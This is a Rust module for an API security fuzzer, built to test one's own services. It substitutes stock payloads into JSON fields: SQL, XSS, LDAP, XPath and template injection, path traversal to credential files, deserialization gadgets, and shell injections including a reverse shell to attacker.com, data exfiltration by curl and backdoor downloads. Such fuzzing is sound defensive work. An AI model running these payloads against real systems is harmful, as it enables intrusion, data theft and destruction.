use super::payload_fuzzer::{FuzzTestCase, FuzzingStrategy, generate_fuzz_test_cases};
use super::data_generator::FuzzingConfig;
use crate::utils::knowledge_base::KnowledgeBase;
use serde_json::Value;

#[derive(Debug, Clone)]
pub struct SecurityFuzzer {
    config: FuzzingConfig,
    target_vulnerabilities: Vec<VulnerabilityType>,
}

#[derive(Debug, Clone)]
pub enum VulnerabilityType {
    SqlInjection,
    XssInjection,
    CommandInjection,
    PathTraversal,
    BufferOverflow,
    FormatStringBug,
    LdapInjection,
    XpathInjection,
    TemplateInjection,
    HeaderInjection,
    TypeConfusion,
    MemoryCorruption,
    LogicBombs,
    DeserializationAttacks,
}

impl SecurityFuzzer {
    pub fn new(config: FuzzingConfig) -> Self {
        Self {
            config,
            target_vulnerabilities: vec![
                VulnerabilityType::SqlInjection,
                VulnerabilityType::XssInjection,
                VulnerabilityType::CommandInjection,
                VulnerabilityType::PathTraversal,
                VulnerabilityType::BufferOverflow,
                VulnerabilityType::FormatStringBug,
                VulnerabilityType::LdapInjection,
                VulnerabilityType::XpathInjection,
                VulnerabilityType::TemplateInjection,
                VulnerabilityType::HeaderInjection,
                VulnerabilityType::TypeConfusion,
                VulnerabilityType::DeserializationAttacks,
            ],
        }
    }

    pub fn with_vulnerabilities(mut self, vulnerabilities: Vec<VulnerabilityType>) -> Self {
        self.target_vulnerabilities = vulnerabilities;
        self
    }

    pub fn generate_security_fuzz_tests(
        &self,
        original_payload: &Value,
        kb: Option<&KnowledgeBase>,
    ) -> Vec<FuzzTestCase> {
        let mut test_cases = Vec::new();

        // Generate general fuzz tests - limit to 3
        test_cases.extend(generate_fuzz_test_cases(original_payload, kb, self.config.clone()).into_iter().take(3));

        // Generate specific vulnerability tests - limit to first 3 types only
        for vuln_type in self.target_vulnerabilities.iter().take(3) {
            let vuln_tests = self.generate_vulnerability_specific_tests(original_payload, vuln_type);
            test_cases.extend(vuln_tests.into_iter().take(2)); // Max 2 per vulnerability type
        }

        // Skip advanced and edge case tests to reduce load
        // test_cases.extend(self.generate_advanced_security_tests(original_payload));
        // test_cases.extend(self.generate_edge_case_tests(original_payload));

        test_cases
    }

    fn generate_vulnerability_specific_tests(
        &self,
        original_payload: &Value,
        vuln_type: &VulnerabilityType,
    ) -> Vec<FuzzTestCase> {
        let mut test_cases = Vec::new();

        match vuln_type {
            VulnerabilityType::SqlInjection => {
                test_cases.extend(self.generate_sql_injection_tests(original_payload));
            },
            VulnerabilityType::XssInjection => {
                test_cases.extend(self.generate_xss_tests(original_payload));
            },
            VulnerabilityType::CommandInjection => {
                test_cases.extend(self.generate_command_injection_tests(original_payload));
            },
            VulnerabilityType::PathTraversal => {
                test_cases.extend(self.generate_path_traversal_tests(original_payload));
            },
            VulnerabilityType::BufferOverflow => {
                test_cases.extend(self.generate_buffer_overflow_tests(original_payload));
            },
            VulnerabilityType::FormatStringBug => {
                test_cases.extend(self.generate_format_string_tests(original_payload));
            },
            VulnerabilityType::LdapInjection => {
                test_cases.extend(self.generate_ldap_injection_tests(original_payload));
            },
            VulnerabilityType::XpathInjection => {
                test_cases.extend(self.generate_xpath_injection_tests(original_payload));
            },
            VulnerabilityType::TemplateInjection => {
                test_cases.extend(self.generate_template_injection_tests(original_payload));
            },
            VulnerabilityType::HeaderInjection => {
                test_cases.extend(self.generate_header_injection_tests(original_payload));
            },
            VulnerabilityType::TypeConfusion => {
                test_cases.extend(self.generate_type_confusion_tests(original_payload));
            },
            VulnerabilityType::DeserializationAttacks => {
                test_cases.extend(self.generate_deserialization_tests(original_payload));
            },
            _ => {
                // For other vulnerability types, generate generic malicious tests
                test_cases.extend(self.generate_generic_malicious_tests(original_payload, vuln_type));
            },
        }

        test_cases
    }

    fn generate_sql_injection_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; WAITFOR DELAY '00:00:05'; --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
            "' UNION SELECT null, username, password FROM users --",
            "'; INSERT INTO users VALUES('hacker','password'); --",
            "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
        ];

        self.generate_injection_test_cases(original_payload, &sql_payloads, "SQL_Injection")
    }

    fn generate_xss_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "\"'><script>alert('XSS')</script>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<video><source onerror=\"alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
            "<object data=\"data:text/html,<script>alert('XSS')</script>\">",
        ];

        self.generate_injection_test_cases(original_payload, &xss_payloads, "XSS_Injection")
    }

    fn generate_command_injection_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let cmd_payloads = [
            "; ls -la",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| type C:\\windows\\system32\\drivers\\etc\\hosts",
            "; ping -c 4 127.0.0.1",
            "& echo vulnerable",
            "`sleep 5`",
            "; curl http://attacker.com/steal-data",
            "| wget http://malicious.com/backdoor.sh",
            "; rm -rf /",
            "& shutdown /s /t 0",
            "; nc -e /bin/sh attacker.com 4444",
        ];

        self.generate_injection_test_cases(original_payload, &cmd_payloads, "Command_Injection")
    }

    fn generate_path_traversal_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/www/../../etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "file:///etc/passwd",
            "file://c:/windows/system32/drivers/etc/hosts",
            "../../../proc/self/environ",
            "..\\..\\..\\boot.ini",
            "/etc/shadow",
            "C:\\windows\\system32\\config\\system",
            "../../../home/user/.ssh/id_rsa",
            "\\\\127.0.0.1\\c$\\windows\\system32\\drivers\\etc\\hosts",
        ];

        self.generate_injection_test_cases(original_payload, &path_payloads, "Path_Traversal")
    }

    fn generate_buffer_overflow_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let mut test_cases = Vec::new();

        if let Value::Object(obj) = original_payload {
            let overflow_sizes = [100, 255, 256, 512, 1024, 2048, 4096, 8192, 16384, 65535, 65536];
            let overflow_chars = ["A", "1", "\x41", "\x7F", "\x00"];

            for (_i, &size) in overflow_sizes.iter().enumerate() {
                for (j, &ch) in overflow_chars.iter().enumerate() {
                    let mut overflow_obj = obj.clone();
                    let overflow_string = ch.repeat(size);

                    for (_, value) in overflow_obj.iter_mut() {
                        if value.is_string() {
                            *value = Value::String(overflow_string.clone());
                        }
                    }

                    test_cases.push(FuzzTestCase::new(
                        format!("Buffer_Overflow_{}_{}", size, j),
                        Value::Object(overflow_obj),
                        FuzzingStrategy::Overflow,
                        format!("Buffer overflow test with {} characters of '{}'", size, ch),
                        "Should handle large inputs without memory corruption or crashes".to_string(),
                    ));
                }
            }
        }

        test_cases
    }

    fn generate_format_string_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let format_payloads = [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "%08x%08x%08x%08x%08x",
            "%.1000d%.1000d%.1000d",
            "%99999999999s",
            "%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%",
            "%1$*2$d%3$n",
            "%1000000000d",
            "%.1000000000d",
        ];

        self.generate_injection_test_cases(original_payload, &format_payloads, "Format_String")
    }

    fn generate_ldap_injection_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "*)|(objectClass=*",
            "*))%00",
            "admin*",
            "*)(cn=*))(|(cn=*",
            "*)|(|(password=*)|(uid=*",
            "*))|(|(objectClass=*))",
            "*)(userPassword=*))(|(userPassword=*",
            "*)(|(memberOf=*))",
        ];

        self.generate_injection_test_cases(original_payload, &ldap_payloads, "LDAP_Injection")
    }

    fn generate_xpath_injection_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let xpath_payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
            "test' and count(/*)=1 and 'test'='test",
            "' and string-length(name(parent::*))>0 and ''='",
            "test' or position()=2 and 'test'='test",
            "' or substring(//user[1]/password,1,1)='a",
            "test' and count(//user)>0 and 'test'='test",
        ];

        self.generate_injection_test_cases(original_payload, &xpath_payloads, "XPath_Injection")
    }

    fn generate_template_injection_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let template_payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
            "${{7*7}}",
            "#{7*7}",
            "*{7*7}",
            "@{7*7}",
            "{{config.items()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()}",
        ];

        self.generate_injection_test_cases(original_payload, &template_payloads, "Template_Injection")
    }

    fn generate_header_injection_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let header_payloads = [
            "test\r\nX-Injected: true",
            "test\nSet-Cookie: injected=true",
            "test\r\nLocation: http://evil.com",
            "test\n\nHTTP/1.1 200 OK\nContent-Length: 0\n\nHTTP/1.1 200 OK",
            "test\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
            "test%0d%0aSet-Cookie:%20injected=true",
            "test%0aLocation:%20http://evil.com",
        ];

        self.generate_injection_test_cases(original_payload, &header_payloads, "Header_Injection")
    }

    fn generate_type_confusion_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let mut test_cases = Vec::new();

        if let Value::Object(obj) = original_payload {
            let transformations: Vec<(&str, Box<dyn Fn(&Value) -> Value>)> = vec![
                ("string_to_number", Box::new(|_| Value::Number(serde_json::Number::from(42)))),
                ("string_to_boolean", Box::new(|_| Value::Bool(true))),
                ("string_to_null", Box::new(|_| Value::Null)),
                ("string_to_array", Box::new(|_| Value::Array(vec![Value::String("confused".to_string())]))),
                ("string_to_object", Box::new(|_| {
                    let mut map = serde_json::Map::new();
                    map.insert("confused".to_string(), Value::Bool(true));
                    Value::Object(map)
                })),
                ("number_to_string", Box::new(|_| Value::String("not_a_number".to_string()))),
                ("boolean_to_string", Box::new(|_| Value::String("true".to_string()))),
                ("array_to_string", Box::new(|_| Value::String("[1,2,3]".to_string()))),
                ("object_to_string", Box::new(|_| Value::String("{\"key\":\"value\"}".to_string()))),
            ];

            for (name, transformer) in &transformations {
                let mut confused_obj = obj.clone();
                for (_, value) in confused_obj.iter_mut() {
                    *value = transformer(value);
                }

                test_cases.push(FuzzTestCase::new(
                    format!("Type_Confusion_{}", name),
                    Value::Object(confused_obj),
                    FuzzingStrategy::TypeConfusion,
                    format!("Type confusion test: {}", name),
                    "Should enforce proper type validation and reject type-confused inputs".to_string(),
                ));
            }
        }

        test_cases
    }

    fn generate_deserialization_tests(&self, _original_payload: &Value) -> Vec<FuzzTestCase> {
        let deserialization_payloads = [
            r#"{"__class__": "os.system", "args": ["rm -rf /"]}"#,
            r#"{"$type": "System.Diagnostics.Process", "StartInfo": {"FileName": "calc.exe"}}"#,
            r#"{"rO0": "base64_encoded_malicious_object"}"#,
            r#"{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://evil.com/Exploit"}"#,
            r#"{"_$$ND_FUNC$$_": "require('child_process').exec('rm -rf /', function(){});"}"#,
        ];

        let mut test_cases = Vec::new();

        for (i, payload) in deserialization_payloads.iter().enumerate() {
            if let Ok(parsed) = serde_json::from_str::<Value>(payload) {
                test_cases.push(FuzzTestCase::new(
                    format!("Deserialization_Attack_{}", i + 1),
                    parsed,
                    FuzzingStrategy::Malicious,
                    "Deserialization attack test".to_string(),
                    "Should safely deserialize data without executing malicious code".to_string(),
                ));
            }
        }

        test_cases
    }

    fn generate_generic_malicious_tests(&self, original_payload: &Value, vuln_type: &VulnerabilityType) -> Vec<FuzzTestCase> {
        let generic_payloads = [
            "malicious_payload",
            "../../../etc/passwd",
            "<script>alert('XSS')</script>",
            "'; DROP TABLE users; --",
            "$(whoami)",
            "\x00\x01\x02\x03\x04\x05",
        ];

        self.generate_injection_test_cases(original_payload, &generic_payloads, &format!("{:?}", vuln_type))
    }

    fn generate_injection_test_cases(&self, original_payload: &Value, payloads: &[&str], test_type: &str) -> Vec<FuzzTestCase> {
        let mut test_cases = Vec::new();

        if let Value::Object(obj) = original_payload {
            for (i, payload) in payloads.iter().enumerate() {
                let mut injection_obj = obj.clone();
                for (_, value) in injection_obj.iter_mut() {
                    if value.is_string() {
                        *value = Value::String(payload.to_string());
                    }
                }

                test_cases.push(FuzzTestCase::new(
                    format!("{}_{}", test_type, i + 1),
                    Value::Object(injection_obj),
                    FuzzingStrategy::Injection,
                    format!("{} vulnerability test", test_type.replace("_", " ")),
                    format!("Should detect and prevent {} attacks", test_type.replace("_", " ").to_lowercase()),
                ));
            }
        }

        test_cases
    }

    fn generate_advanced_security_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let mut test_cases = Vec::new();

        // Race condition tests
        test_cases.extend(self.generate_race_condition_tests(original_payload));

        // Time-based attack tests
        test_cases.extend(self.generate_timing_attack_tests(original_payload));

        // Memory exhaustion tests
        test_cases.extend(self.generate_memory_exhaustion_tests(original_payload));

        test_cases
    }

    fn generate_race_condition_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let mut test_cases = Vec::new();

        // Generate payloads that might trigger race conditions
        if let Value::Object(obj) = original_payload {
            let mut race_obj = obj.clone();
            race_obj.insert("concurrent_request".to_string(), Value::Bool(true));
            race_obj.insert("timing_window".to_string(), Value::Number(serde_json::Number::from(0)));

            test_cases.push(FuzzTestCase::new(
                "Race_Condition_Test".to_string(),
                Value::Object(race_obj),
                FuzzingStrategy::Mixed,
                "Race condition vulnerability test".to_string(),
                "Should handle concurrent requests safely without race conditions".to_string(),
            ));
        }

        test_cases
    }

    fn generate_timing_attack_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let mut test_cases = Vec::new();

        if let Value::Object(obj) = original_payload {
            let timing_payloads = [
                "admin",
                "administrator",
                "root",
                "user",
                "test",
                "nonexistent_user_with_very_long_name_to_test_timing_differences",
            ];

            for (i, payload) in timing_payloads.iter().enumerate() {
                let mut timing_obj = obj.clone();
                for (key, value) in timing_obj.iter_mut() {
                    if key.contains("username") || key.contains("user") || key.contains("login") {
                        *value = Value::String(payload.to_string());
                    }
                }

                test_cases.push(FuzzTestCase::new(
                    format!("Timing_Attack_{}", i + 1),
                    Value::Object(timing_obj),
                    FuzzingStrategy::Mixed,
                    "Timing attack vulnerability test".to_string(),
                    "Should have consistent response times regardless of input validity".to_string(),
                ));
            }
        }

        test_cases
    }

    fn generate_memory_exhaustion_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let mut test_cases = Vec::new();

        if let Value::Object(obj) = original_payload {
            // Create deeply nested objects to exhaust memory
            let mut memory_obj = obj.clone();
            let mut nested = Value::Object(serde_json::Map::new());
            
            for i in 0..1000 {
                let mut temp_map = serde_json::Map::new();
                temp_map.insert(format!("level_{}", i), nested);
                nested = Value::Object(temp_map);
            }
            
            memory_obj.insert("memory_bomb".to_string(), nested);

            test_cases.push(FuzzTestCase::new(
                "Memory_Exhaustion_Test".to_string(),
                Value::Object(memory_obj),
                FuzzingStrategy::Overflow,
                "Memory exhaustion attack test".to_string(),
                "Should handle large nested structures without memory exhaustion".to_string(),
            ));
        }

        test_cases
    }

    fn generate_edge_case_tests(&self, original_payload: &Value) -> Vec<FuzzTestCase> {
        let mut test_cases = Vec::new();

        // Empty payload test
        test_cases.push(FuzzTestCase::new(
            "Empty_Payload_Test".to_string(),
            Value::Object(serde_json::Map::new()),
            FuzzingStrategy::Boundary,
            "Empty payload test".to_string(),
            "Should handle empty payloads gracefully".to_string(),
        ));

        // Null payload test
        test_cases.push(FuzzTestCase::new(
            "Null_Payload_Test".to_string(),
            Value::Null,
            FuzzingStrategy::Boundary,
            "Null payload test".to_string(),
            "Should handle null payloads appropriately".to_string(),
        ));

        // Maximum size payload test
        if let Value::Object(obj) = original_payload {
            let mut max_obj = obj.clone();
            for (_, value) in max_obj.iter_mut() {
                if value.is_string() {
                    *value = Value::String("X".repeat(self.config.max_string_length));
                }
            }

            test_cases.push(FuzzTestCase::new(
                "Maximum_Size_Test".to_string(),
                Value::Object(max_obj),
                FuzzingStrategy::Boundary,
                "Maximum size payload test".to_string(),
                "Should handle maximum-sized payloads without issues".to_string(),
            ));
        }

        test_cases
    }
}
